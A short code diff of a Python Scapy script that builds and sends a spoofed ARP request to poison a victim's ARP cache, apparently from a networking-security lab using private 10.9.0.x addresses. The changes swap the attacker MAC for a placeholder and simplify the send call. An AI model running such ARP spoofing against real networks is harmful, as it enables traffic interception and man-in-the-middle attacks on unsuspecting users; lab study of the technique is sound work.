@@ -5,7 +5,7 @@ from scapy.all import *
 VICTIM_IP = "10.9.0.5"      # Target IP (who will get poisoned)
 TARGET_MAC = "02:42:0a:09:00:05"  # MAC of the target (victim)
 FAKE_IP = "10.9.0.7"        # Pretend to be this IP
-ATTACKER_MAC = "02:42:0a:09:00:69"
+ATTACKER_MAC = "AA:BB:CC:DD:EE:FF"
 
 print("SENDING SPOOFED ARP REQUEST...")
 
@@ -22,4 +22,4 @@ arp.hwdst = "00:00:00:00:00:00"  # Standard for ARP Request
 
 # Combine and send
 packet = ether / arp
-sendp(packet, iface="eth0", verbose=False)
+sendp(packet)
